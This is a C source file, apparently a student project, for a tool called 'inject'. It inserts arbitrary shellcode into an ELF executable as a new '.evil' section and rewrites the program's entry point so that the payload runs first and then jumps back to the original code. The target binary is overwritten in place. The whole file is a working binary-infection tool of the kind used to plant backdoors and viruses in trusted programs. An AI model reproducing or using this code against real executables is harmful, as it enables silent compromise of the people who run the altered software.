#include <stdio.h>
#include <getopt.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <inttypes.h>
#include <elf.h>
#include <sys/user.h>

/* 
 * inject(1): Inject a new section '.evil' into an ELF file and
 *   change the entry point to code in this section.
 *      James Sullivan <sullivan.james.f@gmail.com>
 *      10095183
 */

#if __x86_64__
#define UWORD unsigned long long
#define WORD long long
#define ARCH_JUMP_INSTR '\xe9'
#define ARCH_REDIR_SZ 5
#define ARCH_BASE_ADDR 0x400000
#define ElfN_Ehdr    Elf64_Ehdr
#define ElfN_Shdr    Elf64_Shdr
#define ElfN_Phdr    Elf64_Phdr
#define ElfN_Dyn     Elf64_Dyn
#define ElfN_Rela    Elf64_Rela
#define ElfN_Sym     Elf64_Sym
#define print_addr(format, ...) do {            \
    printf(format "0x%016Lx",                   \
            (unsigned long long)__VA_ARGS__);   \
} while(0)
#else
#define UWORD unsigned long
#define WORD long 
#define ARCH_JUMP_INSTR '\xe9'
#define ARCH_REDIR_SZ 5
#define ARCH_BASE_ADDR 0x8000000
#define ElfN_Ehdr    Elf32_Ehdr
#define ElfN_Shdr    Elf32_Shdr
#define ElfN_Phdr    Elf32_Phdr
#define ElfN_Dyn     Elf32_Dyn
#define ElfN_Rela    Elf32_Rela
#define ElfN_Sym     Elf32_Sym
#define print_addr(format, ...) do {            \
    printf(format "0x%08x",                     \
            (unsigned int)__VA_ARGS__);         \
} while(0)
#endif

const char *SECT_NAME = ".evil";
const char JMP_INSTR = ARCH_JUMP_INSTR;
int REDIR_SZ = 5;
UWORD BASE_ADDR = ARCH_BASE_ADDR;

int print_bytes(unsigned char *buf, size_t num)
{
    int i = 0;
    printf("0x");
    for(i = 0; i < num; i++){
        printf("%02x",(unsigned int)buf[i]);
    }
    printf("\n");

    return 0;
}

/* Reads the entire contents of the file into memory
 * and returns a pointer to the containing buffer.
 * Returns -1 on failure, or the bytes read on success.
 */
int read_file(FILE *f, char **dat) 
{
    if(!f)
        return -1;

    /* Find the file size */
    size_t sz;
    fseek(f, 0L, SEEK_END);
    sz = ftell(f);
    fseek(f, 0L, SEEK_SET);

    *dat = malloc(sz);
    if(!*dat) {
        return -1;
    }
    int bytes_read;
    bytes_read = fread(*dat, 1, sz, f);
    if(bytes_read < sz) {
        free(*dat);
        *dat = NULL;
        return -1;
    }

    return bytes_read;
}

/* Returns a pointer to the n'th Section Header 
 * in the ELF loaded in a buffer, or 0 if it does not exist.
 */
ElfN_Shdr *get_s_header(char *elf, unsigned int index)
{
    if(!elf)
        return 0;

    ElfN_Ehdr *ehdr;
    ehdr = (ElfN_Ehdr *)elf;

    if(ehdr->e_shnum <= index)
        return 0;

    UWORD addr;
    /* Address is base + header offset + (index * header size) */
    addr = (UWORD)elf + ehdr->e_shoff + 
        (ehdr->e_shentsize * index);
    return (ElfN_Shdr *)addr;
}

/*
 * Returns a pointer to the n'th Program Header
 * in the ELF loaded in a buffer, or 0 if it does not exist.
 */
ElfN_Phdr *get_p_header(char *elf, unsigned int index)
{
    if(!elf)
        return 0;

    ElfN_Ehdr *ehdr;
    ehdr = (ElfN_Ehdr *)elf;

    if(ehdr->e_phnum <= index)
        return 0;

    UWORD addr;
    /* Address is base + header offset + (index * header size) */
    addr = (UWORD)elf + ehdr->e_phoff + 
        (ehdr->e_phentsize * index);
    return (ElfN_Phdr *)addr;
}

/*
 * Returns 1 if the address is within the segment described by phdr,
 * and 0 otherwise.
 */
int in_segment(void *addr, ElfN_Phdr *phdr)
{
    if(!phdr)
        return 0;

    if((UWORD)addr > (UWORD)phdr->p_offset)
        if((UWORD)addr < (UWORD)phdr->p_offset 
                + (UWORD)phdr->p_filesz)
            return 1;


    return 0;
}


/*
 * Returns a pointer to the Section Header String Table for the 
 *  ELF, if it exists.
 *  Returns 0 otherwise
 */
char *find_sh_strtab(char *elf)
{
    if(!elf)
        return 0;

    ElfN_Ehdr *ehdr;
    ehdr = (ElfN_Ehdr *)elf;

    /* Get the section index of the SH_STRTAB */
    uint16_t ind;
    ind = ehdr->e_shstrndx;
    if(ind == SHN_UNDEF)
        return 0;

    UWORD addr;
    ElfN_Shdr *shdr;
    shdr = get_s_header(elf, ind);
    if(!shdr)
        return 0;
    /* Address of strtab = 
     * base_address + sh_addr */
    addr = (UWORD)elf + shdr->sh_offset;
    char *strtab;
    strtab = (char *)addr;

    return strtab;
}


/* Returns a pointer to the start of a section with a given
 * name, if it exists. Returns 0 otherwise.
 */
ElfN_Shdr *find_section_hdr(char *elf, const char *sect_name)
{
    if(!elf || !sect_name)
        return 0;

    ElfN_Ehdr *ehdr;
    ehdr = (ElfN_Ehdr *)elf;

    /* Find the Section Header String Table */
    char *strtab;
    strtab = find_sh_strtab(elf);
    if(!strtab)
        return 0;

    /* Check all of the sections for their name in the strtab */
    int i;
    unsigned int str_ind;
    char *name;
    ElfN_Shdr *shdr;
    for(i = 0; i < ehdr->e_shnum; i++) {
        shdr = get_s_header(elf, i);
        /* Check the entry in the strtab for equality */
        str_ind = shdr->sh_name; 
        name = &strtab[str_ind];
        if(!strcmp(name, sect_name))
            break;
    }

    if(i == ehdr->e_shnum)
        return 0;

    return shdr;
}

/*
 * Returns the index in the Section Header table for the given
 * section header, or -1 if it is not a valid entry.
 */
int shdr_index(char *elf, ElfN_Shdr *shdr)
{
    if(!elf || !shdr)
        return -1;
    if((UWORD)elf > (UWORD)shdr)
        return -1;

    ElfN_Ehdr *ehdr;
    ehdr = (ElfN_Ehdr *)elf;

    WORD addr;
    addr = (UWORD)shdr - (UWORD)elf - ehdr->e_shoff;
    if(addr < 0)
        return -1;

    if(addr % ehdr->e_shentsize)
        return -1;

    int ind;
    ind = addr / ehdr->e_shentsize;
    if(ind >= ehdr->e_shnum)
        return -1;

    return ind;
}

/*
 * Returns the index in the Program Header table for the given
 * program header, or -1 if it is not a valid entry.
 */
int phdr_index(char *elf, ElfN_Phdr *phdr)
{
    if(!elf || !phdr)
        return -1;
    if((UWORD)elf > (UWORD)phdr)
        return -1;

    ElfN_Ehdr *ehdr;
    ehdr = (ElfN_Ehdr *)elf;

    WORD addr;
    addr = (UWORD)phdr - (UWORD)elf - ehdr->e_phoff;
    if(addr < 0)
        return -1;

    if(addr % ehdr->e_phentsize)
        return -1;

    int ind;
    ind = addr / ehdr->e_phentsize;
    if(ind >= ehdr->e_phnum)
        return -1;

    return ind;
}
/* Returns a pointer to the Program Header for the first executable
 * (and LOADed) segment. Returns 0 otherwise.
 */
ElfN_Phdr *find_exec_phdr(char *elf)
{
    if(!elf)
        return 0;

    ElfN_Ehdr *ehdr;
    ehdr = (ElfN_Ehdr *)elf;

    /* Check each Program Header for being executable */
    ElfN_Phdr *phdr;
    int i;
    for(i = 0; i < ehdr->e_phnum; i++) {
        phdr = get_p_header(elf,i); 
        if(phdr->p_type == PT_LOAD &&
                (phdr->p_flags & PF_X))
            break;
    }

    if(i == ehdr->e_phnum)
        return 0;

    return phdr;
}

/* Expands the size of any segments containing addr by n bytes,
 *  by increasing its filesz (and memsz if it is loaded).
 * Segments starting after this one but not containing base are
 *  offset by n.
 * Returns 0 on success, and 1 on failure.
 */
int expand_segments(char *elf, void *addr, size_t n)
{
    if(!elf || !addr)
        return 1;
    if((UWORD)elf > (UWORD)addr)
        return 1;

    int i;
    i = 0;
    ElfN_Phdr *phdr_next;
    int expand;
    expand = 0;
    while((phdr_next = get_p_header(elf,i++))) {
        UWORD phdr_start, phdr_end;
        UWORD sect_start, sect_end;
        phdr_start = phdr_next->p_offset;
        phdr_end = phdr_start + phdr_next->p_filesz;
        sect_start = (UWORD)addr - (UWORD)elf;
        sect_end = sect_start + n;
        /* Case 1 segment before section */
        if(phdr_start < sect_start && phdr_end < sect_start) {
            /* Nothing to do */
        } 
        /* Case 2 segment contains start of section */
        else if (phdr_start < sect_start && phdr_end < sect_end) {
            expand = 1; 
        }
        /* Case 3 segment contains end of section */
        else if (phdr_start >= sect_start && phdr_start < sect_start 
                && phdr_end >= sect_end) {
            expand = 1;
        }
        /* Case 4 segment contains the section entirely */
        else if(phdr_start < sect_start && phdr_end >= sect_end) {
            expand = 1;
        }
        /* Case 5 segment is after the section */
        else {
            phdr_next->p_offset += n;
            if(phdr_next->p_vaddr) {
                phdr_next->p_paddr += n;
                phdr_next->p_vaddr += n;
            }
        }
        if(expand) {
            phdr_next->p_filesz += n;
            if(phdr_next->p_memsz)
                phdr_next->p_memsz += n;
            expand = 0;
        }
    }

    return 0;
}

/* Shifts the address of all dynamic section entries by n bytes,
 * if they are between base and top.
 * Returns 0 on success, 1 on failure
 */
int rearrange_dynamic(char *elf, ElfN_Shdr *shdr, void *base, void *top,
        size_t n)
{
    if(!elf || !shdr)
        return 1;
    if(shdr->sh_type != SHT_DYNAMIC)
        return 1;

    int num_entries;
    num_entries = shdr->sh_size / sizeof(ElfN_Dyn);
    int i;
    ElfN_Dyn *dyn_ent;
    for(i = 0; i < num_entries; i++) {
        UWORD addr_of_dyn_ent;
        addr_of_dyn_ent = (UWORD)elf + shdr->sh_offset 
            + (i * sizeof(ElfN_Dyn));
        dyn_ent = (ElfN_Dyn *)addr_of_dyn_ent;
        /* Only apply to dyn entries with addresses */
        if((UWORD)dyn_ent->d_un.d_ptr >= BASE_ADDR) {
            if((UWORD)dyn_ent->d_un.d_ptr >= (UWORD)base
                    && (UWORD)dyn_ent->d_un.d_ptr < (UWORD)top) 
                dyn_ent->d_un.d_ptr += n;
        }
    }

    return 0;
}


/* Shifts the offsets of all relocation objects by n bytes,
 *  if they are between base and top.
 * Returns 0 on success and 1 on failure.
 */
int rearrange_relocs(char *elf, void *base, void *top,
        size_t n)
{
    if(!elf)
        return 1;

    int sh_num;
    sh_num = 0;
    ElfN_Shdr *shdr;

    /* Have to check every section */
    while((shdr = get_s_header(elf,sh_num++))) {
        if(shdr->sh_type == SHT_RELA) {
            int num;
            num = shdr->sh_size / sizeof(ElfN_Rela);
            int i;
            ElfN_Rela *rel;
            for(i = 0; i < num; i++) {
                UWORD addr;
                addr = ((UWORD)elf + shdr->sh_offset 
                        + (i * sizeof(ElfN_Rela)));
                rel = (ElfN_Rela *)addr;
                if((UWORD)rel->r_offset >= (UWORD)base
                        && (UWORD)rel->r_offset < (UWORD)top) {
                    rel->r_offset += n;
                }
            }
        }
    }

    return 0;
}

/* Shifts the offsets of all symbols by n bytes,
 *  if they are between base and top.
 */
int rearrange_syms(char *elf, void *base, void *top,
        size_t n)
{
    if(!elf)
        return 1;

    int sh_num;
    sh_num = 0;
    ElfN_Shdr *shdr;

    /* Have to check every section */
    while((shdr = get_s_header(elf,sh_num++))) {
        if(shdr->sh_type == SHT_DYNSYM) {
            int num;
            num = shdr->sh_size / sizeof(ElfN_Sym);
            int i;
            ElfN_Sym *sym;
            for(i = 0; i < num; i++) {
                UWORD addr;
                addr = ((UWORD)elf + shdr->sh_offset 
                        + (i * sizeof(ElfN_Sym)));
                sym = (ElfN_Sym *)addr;
                /* Only care for nonzero values */
                if((UWORD)sym->st_value > 0) {
                    if((UWORD)sym->st_value >= (UWORD)base
                            && (UWORD)sym->st_value < (UWORD)top)
                        sym->st_value += n;
                }
            }
        }
    }

    return 0;
}

/* 
 * Shift back all sections following a given one by n bytes,
 *  updating their offsets (and possibly addresses).
 * If alignment is broken, also shift the address of the
 *  section to the next aligned boundary by a bias.
 * Returns the introduced bias on success. 
 */
int shift_sh_offsets(char *elf, ElfN_Shdr *shdr, ElfN_Shdr *dyn_shdr, 
        size_t n, size_t bias)
{
    if(!elf || !shdr)
        return 1;

    int i;
    i = shdr_index(elf, shdr);
    if(i == -1)
        return 1;

    ElfN_Shdr *shdr_next;
    shdr_next = get_s_header(elf, i+1);
    if(!shdr_next) {
        return bias;
    } 

    if(shdr_next->sh_flags & SHF_ALLOC && shdr_next->sh_addralign) {
        /* Set bias to the next aligned value */
        if(bias % shdr_next->sh_addralign) {
            /* Bias set to the next aligned value */
            bias += shdr_next->sh_addralign;
            bias -= (bias % shdr_next->sh_addralign);
        }
    }

    /* Relocatable objects in the section are also shifted */
    rearrange_relocs(elf,
            (void *)shdr_next->sh_addr,
            (void *)shdr_next->sh_addr + shdr_next->sh_size,
            bias);
    /* Symbols are updated too */
    rearrange_syms(elf,
            (void *)shdr_next->sh_addr,
            (void *)shdr_next->sh_addr + shdr_next->sh_size,
            bias);

    /* Increment the offset of the section */
    shdr_next->sh_offset += n;

    int ret;
    ret = shift_sh_offsets(elf,shdr_next,dyn_shdr,n,bias);
    /* Any dynamic objects that live in this section
     * must be shifted; do this after to guarantee we don't
     * shift our dyn table */
    if(dyn_shdr) {
        rearrange_dynamic(elf, dyn_shdr,
                (void *)shdr_next->sh_addr,
                (void *)shdr_next->sh_addr + shdr_next->sh_size,
                bias);
    }

    /* Now we can inc the address by the bias */
    shdr_next->sh_addr += bias;
    return ret;
}


/* Expands the given section by n bytes by increasing its size.
 * Any following sections will have their offsets increased.
 * Any following loaded sections will have their address increased,
 *  with alignment  maintained.
 * Any dynamic objects will have their addresses increased if 
 *  their address is after this section's start.
 * Returns 0 on success, 1 on failure.
 */
int expand_section(char *elf, ElfN_Shdr *shdr, ElfN_Shdr *dyn_shdr, 
        size_t n)
{
    if(!elf || !shdr)
        return 1;
    if(dyn_shdr) {
        if(dyn_shdr->sh_type != SHT_DYNAMIC)
            return 1;
    }

    int i;
    i = shdr_index(elf,shdr);
    if(i == -1)
        return 1;

    shdr->sh_size += n;
    shift_sh_offsets(elf, shdr, dyn_shdr, n, n);

    return 0;
}

/* Injects a new section into the ELF loaded into 'elf',
 *  writing to an expanded buffer and pointing *dst to this buffer.
 * Updates the SHT, PHT, and EHDR.
 *
 * The new section will be added immediately after the .text
 *  section, in the same program segment (ie the executable one).
 *  Its header will be added to the end of the header table.
 *
 * Returns the size of the *dst buffer on success,
 *  0 if the section already exists,
 *  -1 if the injection failed.
 */
int inject_section(char *elf, size_t elf_sz, char *dat, 
        size_t dat_sz, const char *sect_name, char **dst)
{
    if(!elf || !sect_name || !dat)
        goto fail;

    /* Check if the section already exists */
    if(find_section_hdr(elf, sect_name))
        return 0;

    /* Treat the start of the buffer as the start of
     * the ELF file, ie its ELF Header */
    ElfN_Ehdr *ehdr;
    ehdr = (ElfN_Ehdr *)elf;

    /* Allocate memory for our new ELF, 
     * making room for a new SHDR, section name, and the actual code.
     */
    size_t sz = elf_sz + ehdr->e_shentsize + dat_sz + REDIR_SZ
        + strlen(sect_name) + 1;
    sz += 0x2000;/* Plenty of extra buffer room */
    *dst = malloc(sz);
    if(!*dst) 
        goto fail;

    /* How many bytes have been copied from the ELF */
    UWORD bytes_copied; 
    bytes_copied = 0;
    /* How many bytes we have written to the new ELF */
    UWORD bytes_written;
    bytes_written = 0;
    WORD bytes_to_copy;

    char *new_elf;
    new_elf = *dst;

    /* Copy in the EHDR and PHDR table */
    bytes_to_copy = ehdr->e_phoff +
        (ehdr->e_phentsize * ehdr->e_phnum); 
    memcpy(new_elf, elf, bytes_to_copy);
    bytes_copied += bytes_to_copy;
    bytes_written += bytes_to_copy;

    ElfN_Ehdr *new_ehdr;
    new_ehdr = (ElfN_Ehdr *)new_elf;

    /* Starting at the executable segment header, increment the offset
     * held in each program header to make room for the new data
     * until they are all non-overlapping and aligned.*/
    ElfN_Phdr *exec_phdr;
    exec_phdr = find_exec_phdr(new_elf);
    if(!exec_phdr)
        goto fail;


    /* Copy everything to the start of the .text section */
    ElfN_Shdr *text_shdr;
    text_shdr = find_section_hdr(elf, ".text");
    if(!text_shdr)
        goto fail;
    UWORD start_of_text;
    start_of_text = (UWORD)elf + text_shdr->sh_offset;
    bytes_to_copy = start_of_text - (UWORD)elf - bytes_copied;
    memcpy(new_elf+bytes_written, 
            elf+bytes_copied, 
            bytes_to_copy);
    bytes_copied += bytes_to_copy;
    bytes_written += bytes_to_copy;

    /* Inject our new code and mark its offset */
    UWORD new_code_offset = bytes_written;
    bytes_to_copy = dat_sz;
    memcpy(new_elf+bytes_written,
            dat,
            bytes_to_copy);
    bytes_written += bytes_to_copy;

    /* Make room for a jmp instruction after */
    new_elf[bytes_written] = JMP_INSTR;
    UWORD jmp_dst_addr;
    jmp_dst_addr = (UWORD)new_elf + bytes_written + 1;
    int32_t *jmp_dst;
    jmp_dst = (int32_t *)jmp_dst_addr;
    bytes_written += REDIR_SZ;

    /* Expand segments to make room for new code, and shift
     * other segments as needed */
    UWORD addr;
    addr = (UWORD)new_elf + bytes_written - dat_sz - REDIR_SZ;
    expand_segments(new_elf, 
            (void *)addr,
            dat_sz + REDIR_SZ);



    /* Now copy everything to the end of the Section Header 
     *  string table */
    char *sh_strtab;
    sh_strtab = find_sh_strtab(elf);
    if(!sh_strtab)
        goto fail;
    ElfN_Shdr *strtab_header;
    strtab_header = get_s_header(elf, ehdr->e_shstrndx);
    bytes_to_copy = (UWORD) sh_strtab - (UWORD)elf - bytes_copied +
        strtab_header->sh_size;
    memcpy(new_elf+bytes_written,
            elf+bytes_copied,
            bytes_to_copy);
    bytes_copied += bytes_to_copy;
    bytes_written += bytes_to_copy;

    /* Inject the new entry to the strtab */
    int str_ind;
    str_ind = strtab_header->sh_size;
    bytes_to_copy = strlen(sect_name) + 1;
    memcpy(new_elf+bytes_written,
            sect_name,
            bytes_to_copy);
    bytes_written += bytes_to_copy;

    /* Expands the segment offsets and sizes to account for the
     * new strtab entry */
    UWORD strtab_addr;
    strtab_addr = (UWORD)elf + bytes_written - strlen(sect_name) + 1;
    expand_segments(new_elf, 
            (void*)strtab_addr, 
            strlen(sect_name) + 1);

    /* Copy up to the end of the section header table */
    bytes_to_copy = ehdr->e_shoff + 
        (ehdr->e_shentsize * ehdr->e_shnum) - bytes_copied;
    memcpy(new_elf+bytes_written,
            elf+bytes_copied,
            bytes_to_copy);
    bytes_copied += bytes_to_copy;
    bytes_written += bytes_to_copy;

    /* Update the sh_offset */
    new_ehdr->e_shoff += (bytes_written - bytes_copied);

    /* If there's a dynamic section, make note of it */
    int has_dyn;
    has_dyn = 0;
    int dyn_shdr_ind;
    dyn_shdr_ind = 0;
    ElfN_Shdr *dyn_shdr;
    dyn_shdr = find_section_hdr(elf, ".dynamic"); 
    if(dyn_shdr) {
        has_dyn = 1;
        dyn_shdr_ind = shdr_index(elf,dyn_shdr);
        if(dyn_shdr_ind == -1)
            goto fail;
    }
    ElfN_Shdr *new_dyn_shdr;
    if(has_dyn) {
        new_dyn_shdr = get_s_header(new_elf, dyn_shdr_ind);
        if(!new_dyn_shdr)
            goto fail;
    }

    /* The new section is to be inserted before .text, 
     * so update the offsets and addresses of sections .text
     * and above */
    int text_shdr_ind;
    text_shdr_ind = shdr_index(elf, text_shdr);
    if(text_shdr_ind == -1)
        goto fail;
    ElfN_Shdr *new_text_shdr;
    new_text_shdr = get_s_header(new_elf, text_shdr_ind);
    if(!new_text_shdr)
        goto fail;
    /* Our new code starts where .text used to be */
    UWORD new_code_addr = new_text_shdr->sh_addr;
    ElfN_Shdr *prev_hdr;
    prev_hdr = get_s_header(new_elf, text_shdr_ind - 1);
    if(!prev_hdr)
        goto fail;
    expand_section(new_elf, prev_hdr, new_dyn_shdr, 
            dat_sz + REDIR_SZ);

    /* Just undo the size increase for this section, 
     * since we're adding a new one instead */
    prev_hdr->sh_size -= (dat_sz + REDIR_SZ);

    /* We also inserted a new entry in the strtab, so any sections
     * after the .strtab must be similarly shifted */
    ElfN_Shdr *new_sh_strtab_hdr;
    new_sh_strtab_hdr = get_s_header(new_elf, new_ehdr->e_shstrndx);
    if(!new_sh_strtab_hdr) 
        goto fail;    
    expand_section(new_elf, new_sh_strtab_hdr, new_dyn_shdr,
            strlen(sect_name) + 1);

    /* Insert our new section header at the end of the table */
    UWORD new_shdr_addr;
    new_shdr_addr = (UWORD)new_elf + bytes_written;
    ElfN_Shdr *new_shdr;
    new_shdr = (ElfN_Shdr *)new_shdr_addr;
    memset(new_shdr, 0, sizeof(ElfN_Shdr));
    new_shdr->sh_name = str_ind; /* Name index in strtab */
    new_shdr->sh_type = SHT_PROGBITS; /* Contains prog code */
    new_shdr->sh_flags = SHF_EXECINSTR | SHF_ALLOC;
    new_shdr->sh_addr = new_code_addr; 
    new_shdr->sh_offset = new_code_offset; 
    new_shdr->sh_size = dat_sz + REDIR_SZ;
    new_shdr->sh_addralign = new_text_shdr->sh_addralign;

    bytes_written += sizeof(ElfN_Shdr);

    /* Set the new entry point and increment the sh_num */
    new_ehdr->e_entry = new_shdr->sh_addr;
    new_ehdr->e_shnum++;

    /* Copy the rest of the ELF in */
    bytes_to_copy = elf_sz - bytes_copied;
    if(bytes_to_copy) {
        /* If there's anything after the SH table, then
         * we need to make sure that we shift the offsets */
        ElfN_Shdr *next;
        int ind;
        ind = 0;
        while((next = get_s_header(new_elf, ind++))) {
            if(next->sh_offset > (UWORD)new_ehdr->e_shoff)
                next->sh_offset += sizeof(ElfN_Shdr);
        }
        if(bytes_to_copy + bytes_copied > sz)
            goto fail;
        memcpy(new_elf+bytes_written,
                elf+bytes_copied,
                bytes_to_copy);
        bytes_copied += bytes_to_copy;
        bytes_written += bytes_to_copy;
    }

    /* Finally set the jmp target */
    UWORD old_entry;
    old_entry = ehdr->e_entry;
    uint32_t jmp_rel; 
    jmp_rel = (uint32_t)old_entry - (uint32_t)new_shdr->sh_addr;
    jmp_rel -= dat_sz;
    jmp_rel -= REDIR_SZ;
    *jmp_dst = jmp_rel;

    return bytes_written;


fail:
    return -1;
}

int print_usage(char *name)
{
    printf("Usage: %s shellcode program [-h -v]\n",name);
    return 0;
}

int main(int argc, char **argv, char **envp)
{
    if(argc < 3) {
        print_usage(argv[0]);
        exit(1);
    }
    char *shell = argv[1];
    char *elf = argv[2];

    FILE *shell_f, *elf_f;
    char *shell_dat, *elf_dat, *new_elf_dat;
    shell_dat = NULL;
    elf_dat = NULL;
    new_elf_dat = NULL;
    int shell_sz, elf_sz, new_elf_sz;

    /* Read in the shellcode from the data file */
    shell_f = fopen(shell, "rb");
    if(!shell_f) {
        fprintf(stderr, "Failed to open file %s\n",shell);
        goto fail;
    }
    shell_sz = read_file(shell_f, &shell_dat);
    if(!shell_dat) {
        fprintf(stderr, "Failed read from %s\n",shell);
        goto fail;
    }
    fclose(shell_f);
    shell_f = NULL;

    /* Check for \r in the shell */
    if(shell_dat[shell_sz-1] == '\x0a')
        shell_sz--;

    /* Read the ELF file into memory */
    elf_f = fopen(elf, "rb");
    if(!elf_f) {
        fprintf(stderr, "Failed to open file %s\n",elf);
        goto fail;
    }
    elf_sz = read_file(elf_f, &elf_dat);
    if(!elf_dat) {
        fprintf(stderr, "Failed read from %s\n",elf);
        goto fail;
    }
    fclose(elf_f);
    elf_f = NULL;

    /* Splice in the ELF section into new_elf_dat */
    new_elf_sz = inject_section(
            elf_dat, elf_sz, 
            shell_dat, shell_sz, 
            SECT_NAME, &new_elf_dat
            );
    free(elf_dat);
    elf_dat = NULL;
    free(shell_dat);
    shell_dat = NULL;
    if(new_elf_sz == -1) {
        fprintf(stderr, "Failed to splice section\n");
        goto fail;
    } else if(new_elf_sz == 0) {
        /* Nothing to do */
        fprintf(stderr, 
                "Nothing added to ELF (Section already exists)\n");
    } else {
        /* Write the new ELF to file */
        elf_f = fopen(elf, "wb");
        if(!elf_f) {
            fprintf(stderr, "Failed to open %s for writing\n",elf);
            goto fail;
        }
        errno = 0;
        fwrite(new_elf_dat, 1, new_elf_sz, elf_f); 
        if(errno) {
            fprintf(stderr, 
                    "Failed to write new ELF contents (error %d)\n",
                    errno);
            goto fail;
        }
        fclose(elf_f);
        elf_f = NULL;
        printf("Section %s injected into %s\n",SECT_NAME,elf);
        free(new_elf_dat);
    }
    return 0;

fail:
    if(shell_f) 
        fclose(shell_f);
    if(elf_f) 
        fclose(elf_f);
    if(shell_dat)
        free(shell_dat);
    if(elf_dat)
        free(elf_dat);
    return 1;
}

